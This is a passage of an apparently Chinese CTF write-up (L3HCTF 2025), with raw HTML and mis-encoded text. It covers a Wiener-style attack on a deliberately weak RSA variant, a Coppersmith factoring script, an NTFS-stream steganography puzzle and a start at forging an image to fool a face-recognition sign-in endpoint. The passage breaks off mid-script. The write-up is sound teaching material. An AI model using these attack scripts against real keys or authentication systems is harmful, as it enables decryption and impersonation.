class="hljs-number">2</span>**<span class="hljs-number">400</span><br>P.&lt;x&gt; = PolynomialRing(Zmod(t))<br>f = x*<span class="hljs-number">2</span>^<span class="hljs-number">400</span> + p_low<br>f = f.monic()<br>roots = f.small_roots(X=<span class="hljs-number">2</span>^<span class="hljs-number">112</span>,beta=<span class="hljs-number">0.44</span>)<br><br>p = <span class="hljs-built_in">int</span>(roots[<span class="hljs-number">0</span>])*<span class="hljs-number">2</span>^<span class="hljs-number">400</span> + p_low<br>q = t // p<br>phi = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)*(r-<span class="hljs-number">1</span>)<br>d = inverse(<span class="hljs-number">65537</span>, phi)<br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><h2 id="RRRSSSAAA"><a href="#RRRSSSAAA" class="headerlink" title="RRRSSSAAA"></a>RRRSSSAAA</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_vulnerable_key</span>(<span class="hljs-params">bits=<span class="hljs-number">1024</span></span>):<br>    p_bits = bits // <span class="hljs-number">2</span><br>    q_bits = bits - p_bits<br>    <span class="hljs-comment">#pï¼Œqæ¥è¿‘</span><br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        p = random_prime(<span class="hljs-number">2</span>**(p_bits), lbound=<span class="hljs-number">2</span>**(p_bits-<span class="hljs-number">1</span>))<br>        q = random_prime(<span class="hljs-number">2</span>**(q_bits), lbound=<span class="hljs-number">2</span>**(q_bits-<span class="hljs-number">1</span>))<br>        <span class="hljs-keyword">if</span> p != q <span class="hljs-keyword">and</span> p &gt; q <span class="hljs-keyword">and</span> p &lt; <span class="hljs-number">2</span>*q:<span class="hljs-comment">#q&lt;p&lt;2*q</span><br>            <span class="hljs-keyword">break</span><br>            <br>    N = p * q<br>    phi = (p**<span class="hljs-number">4</span> - <span class="hljs-number">1</span>) * (q**<span class="hljs-number">4</span> - <span class="hljs-number">1</span>)<br><br>    d_bits = <span class="hljs-number">1024</span><br>    d_bound = <span class="hljs-number">2</span>**d_bits<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        d_small = randint(<span class="hljs-number">2</span>, d_bound)<br>        d = phi - d_small<br>        <span class="hljs-keyword">if</span> gcd(d, phi) == <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">if</span> d_small.bit_length() == <span class="hljs-number">1021</span>:<br>                <span class="hljs-keyword">break</span><br><br>    e = inverse_mod(d, phi)<br>    <br>    <span class="hljs-keyword">return</span> N, e<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">m, N, e</span>):<br>    n = <span class="hljs-number">4</span><br>    r = <span class="hljs-number">2</span><br>    R = Integers(N)<br>    P = PolynomialRing(R, <span class="hljs-string">&#x27;t&#x27;</span>)<br>    t = P.gen()<br>    Q = P.quotient(t**n - r)<br><br>    m_poly = Q([m, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>])<br><br>    c_poly = m_poly ** e<br><br>    <span class="hljs-keyword">return</span> c_poly.lift()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    N, e = generate_vulnerable_key()<br>    m = <span class="hljs-built_in">int</span>.from_bytes(flag, <span class="hljs-string">&#x27;big&#x27;</span>)<br>    c = encrypt(m, N, e)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;N = <span class="hljs-subst">&#123;N&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;e = <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;c = <span class="hljs-subst">&#123;c&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># N = 99697845285265879829811232968100099666254250525000506525475952592468738395250956460890611762459685140661035795964867321445992110528627232335703962897072608767840783176553829502743629914407970206513639916759403399986924602596286330464348286080258986075962271511105387188070309852907253486162504945490429185609</span><br><span class="hljs-comment"># e = 74900336437853271512557457581304251523854378376434438153117909482138661618901386551154807447783262736408028580620771857416463085746907317126876189023636958838207330193074215769008709076254356539808209005917645822989554532710565445155350102802675594603406077862472881027575871589046600011223990947361848608637247276816477996863812313225929441545045479384803449990623969591150979899801722841101938868710054151839628803383603849632857020369527380816687165487370957857737696187061619496102857237814447790678611448197153594917852504509869007597997670022501500067854210261136878917620198551551460145853528269270832725348151160651020188255399136483482428499340574623409209151124687319668989144444549871527949104436734300277004316939985015286758651969045396343970037328043635061226100170529991733947365830164811844853806681198818875837903563263114249814483901121700854712406832325690101810786429930813776784979083590353027191492894890551838308899148551566437532914838098811643805243593419063566975400775134981190248113477610235165151367913498299241375039256652674679958159505112725441797566678743542054295794919839551675786573113798857814005058856054462008797386322048089657472710775620574463924678367455233801970310210504653908307254926827</span><br><span class="hljs-comment"># c = 98460941530646528059934657633016619266170844887697553075379408285596784682803952762901219607460711533547279478564732097775812539176991062440097573591978613933775149262760936643842229597070673855940231912579258721734434631479496590694499265794576610924303262676255858387586947276246725949970866534023718638879</span><br></code></pre></td></tr></table></figure><p><strong>åˆ†æï¼š</strong><br><strong>ç»´çº³æ”»å‡»</strong><br>è¿™é‡Œå›é¡¾ä¸€ä¸‹RSAç»´çº³æ”»å‡»çš„åŸç†ï¼š<br><strong>ï¼ˆ1ï¼‰æ”»å‡»æ¡ä»¶ï¼š</strong><br>$d&lt;\frac{1}{3}N^{\frac{1}{4}}$</p><blockquote><p>ä¸ºä»€ä¹ˆæœ‰è¿™ä¸ªæ¡ä»¶å‘¢ï¼Œè¿™é‡Œä¸å¾—ä¸æåˆ°<strong>å‹’è®©å¾·å®šç†</strong>ï¼ˆLegendreâ€˜s theoremï¼‰ï¼š<br>è‹¥$|\alpha - \frac{p}{q}|&lt; \frac{1}{2q^2}ï¼Œåˆ™æœ‰\frac{p}{q}ä¸€å®šæ˜¯\alphaçš„æ”¶æ•›å­$</p></blockquote><p>$\because ed &#x3D; k\phi(N)+1$<br>$\therefore ä¸¤è¾¹åŒæ—¶é™¤ä»¥d\phi(N)ï¼Œæœ‰\frac{c}{\phi(N)}-\frac{k}{d}&#x3D;\frac{1}{d\phi(N)}$æ ¹æ®æ¡ä»¶å¯ä»¥å¤§æ¦‚æ¨å‡ºæ˜¯æ»¡è¶³å‹’è®©å¾·å®šç†çš„ï¼Œä½†æ˜¯æˆ‘ä»¬ä¸çŸ¥é“$\phi(N)$ï¼Œå› æ­¤è¦æƒ³åŠæ³•ç”¨$N$ä»£æ›¿ã€‚åŒæ—¶å¯ä»¥å¾—åˆ°$\frac{k}{d}\approx \frac{e}{\phi(N)}ï¼Œåˆ™æœ‰k&lt;d$<br>$\because N\approx \phi(N)$<br>$\therefore è®°s&#x3D;p+q-1è®¡ç®—|\frac{e}{N}-\frac{k}{d}|&#x3D;|\frac{ed-kN}{dN}|&#x3D;|\frac{k\phi(N)+1-kN}{d}N|&#x3D;|\frac{1-ks}{dN}|$<br>$\because s&#x3D;p+q-1&lt;3\sqrt N,k&lt;d,d&lt;\frac{1}{3}N^{\frac{1}{4}}$<br>$\therefore |\frac{e}{N}-\frac{k}{d}|&#x3D;|\frac{1-ks}{dN}|&lt;|\frac{ks}{dN}|&lt;|\frac{s}{N}|&lt;\frac{3}{\sqrt N}&lt;\frac{1}{3d^2}&lt;\frac{1}{2d^2}$<br>$\therefore \frac{k}{d}æ˜¯\frac{e}{N}çš„æ”¶æ•›å­$<br><strong>å‚è€ƒï¼š</strong><a href="https://cot287.github.io/2024/12/22/Crypto/RSA/%E5%B0%8F%E8%A7%A3%E5%AF%86%E6%8C%87%E6%95%B0/wiener%20attack/wiener%20attack/">wiener attack | Cot287â€™s Blog</a><br><strong>ç»“åˆæœ¬é¢˜ï¼š</strong><br>æœ¬é¢˜ä¸­æœ‰ï¼Œ$2^{1020}\leq d_{small} &lt;2^{1021}ï¼Œè™½ç„¶Nä¸º1024ä½ï¼Œ$ä½†ç»“åˆä¸Šè¾¹çš„åˆ†æå¯çŸ¥ï¼Œæˆ‘ä»¬ä½¿ç”¨çš„ä¸ä¸€å®šæ˜¯$N$ï¼Œè€Œæ˜¯ä¸$\phi(N)$ç›¸è¿‘çš„ä¸€ä¸ªå·²çŸ¥çš„æ•°ã€‚ä¸”ä¸Šè¾¹çš„$d$ä¹Ÿä¸ä¸€å®šæ˜¯$d$ï¼Œåªè¦æ˜¯èƒ½å¤Ÿæ»¡è¶³å‹’è®©å¾·å®šç†çš„ä¸€ä¸ªå…³é”®çš„æ•°å³å¯ï¼Œè€Œè¿™é‡Œ$d&#x3D;phi - d_{small}$ï¼Œå› æ­¤éœ€è¦é€šè¿‡æ¨å¯¼ï¼Œè®©è¿™é‡Œçš„$d_{small}$å æ®ä¹‹å‰$d$çš„ä½ç½®<br>$\because \phi(N)&#x3D;(p^4-1)(q^4-1)$<br>$\therefore è¿™é‡Œä½¿ç”¨N_4 &#x3D; N^4&#x3D;p^4q^4$<br>$\because ed &#x3D;k\phi(N)+1$<br>$\therefore e(\phi(N)-d_{small})&#x3D;k\phi(N)+1$<br>$\therefore ed_{small} &#x3D; k\phi(N)-1$<br>$\therefore æ±‚\frac{e}{N_4}$çš„è¿åˆ†æ•°ä¾¿èƒ½æ±‚å¾—$\phi(N)$å’Œ$d$ï¼Œä¹‹åä¾¿èƒ½å¤Ÿåˆ©ç”¨æ±‚å¾—çš„$d$åœ¨ç®€å•çš„ç¯ä¸Š$RSA$è§£å¯†<br><strong>è§£ç­”ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">c_poly, N, d</span>):<br>    R = Integers(N)<br>    P = PolynomialRing(R, <span class="hljs-string">&#x27;t&#x27;</span>)<br>    t = P.gen()<br>    Q = P.quotient(t**<span class="hljs-number">4</span> - <span class="hljs-number">2</span>)<br><br>    c = Q(c_poly)<br>    m_poly = c ** d<br>    <span class="hljs-keyword">return</span> m_poly.lift()[<span class="hljs-number">0</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attack_d</span>(<span class="hljs-params">N, e, c</span>):<br>    N = Integer(N)<br>    e = Integer(e)<br>    N4 = N ^ <span class="hljs-number">4</span><br>    cf = (e / N4).continued_fraction().convergents()<br><br>    <span class="hljs-keyword">for</span> conv <span class="hljs-keyword">in</span> cf:<br>        k = conv.numerator()<br>        d_small = conv.denominator()<br><br>        <span class="hljs-keyword">if</span> d_small &lt; <span class="hljs-number">2</span>^<span class="hljs-number">1020</span> <span class="hljs-keyword">or</span> d_small &gt;= <span class="hljs-number">2</span>^<span class="hljs-number">1021</span>:<br>            <span class="hljs-keyword">continue</span><br><br>        <span class="hljs-keyword">if</span> (e * d_small + <span class="hljs-number">1</span>) % k != <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">continue</span><br>        phi_candidate = (e * d_small + <span class="hljs-number">1</span>) // k<br>        <span class="hljs-comment">#print(&quot;phi=&quot;,phi_candidate)</span><br>        d = phi_candidate - d_small<br>        <span class="hljs-keyword">return</span> d<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Failed to find d&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br><br>N = <span class="hljs-number">99697845285265879829811232968100099666254250525000506525475952592468738395250956460890611762459685140661035795964867321445992110528627232335703962897072608767840783176553829502743629914407970206513639916759403399986924602596286330464348286080258986075962271511105387188070309852907253486162504945490429185609</span><br>e = <span class="hljs-number">74900336437853271512557457581304251523854378376434438153117909482138661618901386551154807447783262736408028580620771857416463085746907317126876189023636958838207330193074215769008709076254356539808209005917645822989554532710565445155350102802675594603406077862472881027575871589046600011223990947361848608637247276816477996863812313225929441545045479384803449990623969591150979899801722841101938868710054151839628803383603849632857020369527380816687165487370957857737696187061619496102857237814447790678611448197153594917852504509869007597997670022501500067854210261136878917620198551551460145853528269270832725348151160651020188255399136483482428499340574623409209151124687319668989144444549871527949104436734300277004316939985015286758651969045396343970037328043635061226100170529991733947365830164811844853806681198818875837903563263114249814483901121700854712406832325690101810786429930813776784979083590353027191492894890551838308899148551566437532914838098811643805243593419063566975400775134981190248113477610235165151367913498299241375039256652674679958159505112725441797566678743542054295794919839551675786573113798857814005058856054462008797386322048089657472710775620574463924678367455233801970310210504653908307254926827</span><br>c = <span class="hljs-number">98460941530646528059934657633016619266170844887697553075379408285596784682803952762901219607460711533547279478564732097775812539176991062440097573591978613933775149262760936643842229597070673855940231912579258721734434631479496590694499265794576610924303262676255858387586947276246725949970866534023718638879</span><br><br>d = attack_d(N, e, c)<br>ans = long_to_bytes(<span class="hljs-built_in">int</span>(decrypt(c,N,d)))<br><span class="hljs-built_in">print</span>(ans)<br></code></pre></td></tr></table></figure><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="é‡å­åŒç”Ÿå½±"><a href="#é‡å­åŒç”Ÿå½±" class="headerlink" title="é‡å­åŒç”Ÿå½±"></a>é‡å­åŒç”Ÿå½±</h2><p><strong>åˆ†æï¼š</strong><br>æœ¬é¢˜ä¸­ç»™äº†ä¸€ä¸ª<code>stream2.rar</code>å‹ç¼©åŒ…ï¼ŒæŸ¥çœ‹äºŒè¿›åˆ¶æ•°æ®ï¼Œå‘ç°å‹ç¼©åŒ…ä¸­å­˜åœ¨ä¸¤ä¸ªæ–‡ä»¶ï¼Œç„¶è€Œç›´æ¥è§£å‹åªèƒ½å¤Ÿè§£å‹å‡ºä¸€ä¸ªå›¾ç‰‡æ–‡ä»¶ã€‚<br><img src="/2025/07/20/L3HCTF%202025%20WriteUp/stream2.webp"><br>æ‰«ç å¯ä»¥å¾—åˆ°ä¸€ä¸ªæç¤ºï¼š</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery">flag <span class="hljs-literal">is</span><span class="hljs-built_in"> not</span> here, but I can give you the<span class="hljs-built_in"> key</span>: <span class="hljs-string">&quot;quantum&quot;</span><br></code></pre></td></tr></table></figure><p>å­˜åœ¨éœ€è¦å¯†ç çš„éšå†™ï¼Œç”±äºè¿˜æœ‰ä¸€ä¸ªæ–‡ä»¶æ²¡æœ‰è§£å‹å‡ºæ¥ï¼ŒçŒœæµ‹æ˜¯å¦ä¸€ä¸ªæ–‡ä»¶çš„éšå†™å¯†ç ä¸º<code>quantum</code>ã€‚<br>é‚£ä¹ˆç°åœ¨éœ€è¦ä¼˜å…ˆå¾—åˆ°ç¬¬äºŒä¸ªæ–‡ä»¶ï¼Œåˆ†æäºŒè¿›åˆ¶æ•°æ®<br><img src="/2025/07/20/L3HCTF%202025%20WriteUp/file-20250722172835947.png"></p><p>å‘ç°ç¬¬äºŒä¸ªæ–‡ä»¶åƒæ˜¯ä¸€ç§æ•°æ®æµå½¢å¼ï¼Œç»“åˆæ–‡ä»¶åä¹Ÿæ˜¯streamï¼ŒçŒœæµ‹å¯èƒ½æ˜¯NTFS å¤‡ç”¨æ•°æ®æµéšå†™ï¼ˆADSï¼‰ã€‚<br>ä½¿ç”¨<code>ntfsstreamseditor</code>å·¥å…·è¿›è¡Œåˆ†ç¦»æ•°æ®æµ<br><img src="/2025/07/20/L3HCTF%202025%20WriteUp/file-20250722173309683.png">æˆåŠŸå¯¼å‡ºï¼Œå¾—åˆ°ç¬¬äºŒå¼ å›¾ç‰‡æ–‡ä»¶<br><img src="/2025/07/20/L3HCTF%202025%20WriteUp/1.webp"><br>ç»“åˆå‰è¾¹ç»™å‡ºçš„å¯†ç ï¼Œç»“åˆå›¾ç‰‡åƒæ˜¯ä¸¤å¼ å›¾ç‰‡çš„èåˆï¼ŒçŒœæµ‹éœ€è¦å…ˆä½¿ç”¨ä¸¤å¼ å›¾ç‰‡è¿›è¡ŒXORï¼Œç„¶åå†ä½¿ç”¨<code>quantum</code>ä½œä¸ºå¯†ç å†æ¬¡è¿›è¡ŒXORï¼Œè¿™é‡Œç›´æ¥å†™ä¸€ä¸ªç®€å•è„šæœ¬è¿›è¡Œè§£å¯†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xor_images</span>(<span class="hljs-params">path1, path2, out_path, key_str=<span class="hljs-string">&quot;quantum&quot;</span></span>):<br>    im1 = Image.<span class="hljs-built_in">open</span>(path1).convert(<span class="hljs-string">&quot;RGB&quot;</span>)<br>    im2 = Image.<span class="hljs-built_in">open</span>(path2).convert(<span class="hljs-string">&quot;RGB&quot;</span>)<br>    <span class="hljs-keyword">if</span> im1.size != im2.size:<br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;ä¸¤å¼ å›¾ç‰‡å°ºå¯¸å¿…é¡»å®Œå…¨ç›¸åŒ&quot;</span>)<br><br>    arr1 = np.array(im1, dtype=np.uint8)<br>    arr2 = np.array(im2, dtype=np.uint8)<br><br>    xor_arr = np.bitwise_xor(arr1, arr2)<br><br>    key_bytes = key_str.encode()<br>    flat = xor_arr.flatten()<br>    key_extended = np.resize(np.frombuffer(key_bytes, dtype=np.uint8),flat.shape)<br>    final_flat = np.bitwise_xor(flat, key_extended)<br><br>    final_arr = final_flat.reshape(xor_arr.shape)<br>    Image.fromarray(final_arr).save(out_path)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;å·²ä¿å­˜ç»“æœåˆ° <span class="hljs-subst">&#123;out_path&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    xor_images(<span class="hljs-string">&quot;1.webp&quot;</span>, <span class="hljs-string">&quot;stream2.webp&quot;</span>, <span class="hljs-string">&quot;out.png&quot;</span>, key_str=<span class="hljs-string">&quot;quantum&quot;</span>)<br></code></pre></td></tr></table></figure><p> ç¬¬ä¸€æ¬¡å¼‚æˆ–ä¹‹åçš„ç»“æœï¼š<br> <img src="/2025/07/20/L3HCTF%202025%20WriteUp/out%201.png"><br> ç¬¬äºŒæ¬¡å¼‚æˆ–ä¹‹åçš„ç»“æœï¼š<br> <img src="/2025/07/20/L3HCTF%202025%20WriteUp/out.png"><br> æ‰«ç å¾—åˆ°flagï¼š<code>L3HCTF&#123;Quantum_ADS_XOR&#125;</code></p><h2 id="Please-Sign-In"><a href="#Please-Sign-In" class="headerlink" title="Please Sign In"></a>Please Sign In</h2><p> <strong>é¢˜ç›®ï¼š</strong><br> <code>embedding.json</code>æ–‡ä»¶+<br> <code>server.py</code>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> uvicorn<br><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI, File, UploadFile<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">from</span> torchvision <span class="hljs-keyword">import</span> transforms<br><span class="hljs-keyword">from</span> torchvision.models <span class="hljs-keyword">import</span> shufflenet_v2_x1_0, ShuffleNet_V2_X1_0_Weights<br><br>feature_extractor = shufflenet_v2_x1_0(weights=ShuffleNet_V2_X1_0_Weights.IMAGENET1K_V1)<br>feature_extractor.fc = torch.nn.Identity()<br>feature_extractor.<span class="hljs-built_in">eval</span>()<br><br>weights = ShuffleNet_V2_X1_0_Weights.IMAGENET1K_V1<br>transform = transforms.Compose([<br>    transforms.ToTensor(),<br>])<br><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(<span class="hljs-string">&quot;embedding.json&quot;</span>):<br>    user_image = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;user_image.jpg&quot;</span>).convert(<span class="hljs-string">&quot;RGB&quot;</span>)<br>    user_image = transform(user_image).unsqueeze(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">with</span> torch.no_grad():<br>        user_embedding = feature_extractor(user_image)[<span class="hljs-number">0</span>]<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;embedding.json&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        json.dump(user_embedding.tolist(), f)<br>    <br>user_embedding = json.load(<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;embedding.json&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>))<br>user_embedding = torch.tensor(user_embedding, dtype=torch.float32)<br>user_embedding = user_embedding.unsqueeze(<span class="hljs-number">0</span>)<br>    <br>app = FastAPI()<br><br><span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">&quot;/signin/&quot;</span></span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">signin</span>(<span class="hljs-params">file: UploadFile = File(<span class="hljs-params">...</span>)</span>):<br>    submit_image = Image.<span class="hljs-built_in">open</span>(file.file).convert(<span class="hljs-string">&quot;RGB&quot;</span>)<br>    submit_image = transform(submit_image).unsqueeze(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">with</span> torch.no_grad():<br>        submit_embedding = feature_extractor(submit_image)[<span class="hljs-number">0</span>]<br>    diff = torch.mean((user_embedding - submit_embedding) ** <span class="hljs-number">2</span>)<br>    result = &#123;<br>        <span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;L3HCTF&#123;test_flag&#125;&quot;</span> <span class="hljs-keyword">if</span> diff.item() &lt; <span class="hljs-number">5e-6</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;failure&quot;</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">root</span>():<br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Welcome to the Face Recognition API!&quot;</span>&#125;<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    uvicorn.run(app, host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">8000</span>)<br></code></pre></td></tr></table></figure><p> <strong>åˆ†æï¼š</strong><br> è¯¥é¢˜ç›®çš„è§£é¢˜æ€è·¯å°±æ˜¯åˆ©ç”¨<code>embedding.json</code>é€†å‘ç”Ÿæˆä¸€å¼ å›¾ç‰‡ï¼Œä½¿ä¸¤è€…çš„<code>embedding</code>å‘é‡å‡æ–¹å·®å€¼å·®å¼‚å°äº<code>5e-6</code>ã€‚å¯ä»¥ç›´æ¥AIä¸€ä¸ªè„šæœ¬ï¼Œæ³¨æ„è¦å°†æœ€åå¾—åˆ°çš„å›¾ç‰‡ä¿å­˜ä¸ºæ— æŸå‹ç¼©çš„<code>png</code>å›¾ç‰‡ã€‚<br> <strong>ä»£ç ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> torchvision.transforms <span class="hljs-keyword">as</span> transforms<br><span class="hljs-keyword">from</span> torchvision.models <span class="hljs-keyword">import</span> shufflenet_v2_x1_0, ShuffleNet_V2_X1_0_Weights<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br><span class="hljs-comment"># åŠ è½½æ¨¡å‹å’Œuser_embedding</span><br>feature_extractor = shufflenet_v2_x1_0(weights=ShuffleNet_V2_X1_0_Weights.IMAGENET1K_V1)<br>feature_extractor.fc = torch.nn.Identity()<br>feature_extractor.<span class="hljs-built_in">eval</span>()<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;embedding.json&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    user_embedding = torch.tensor(json.load(f), 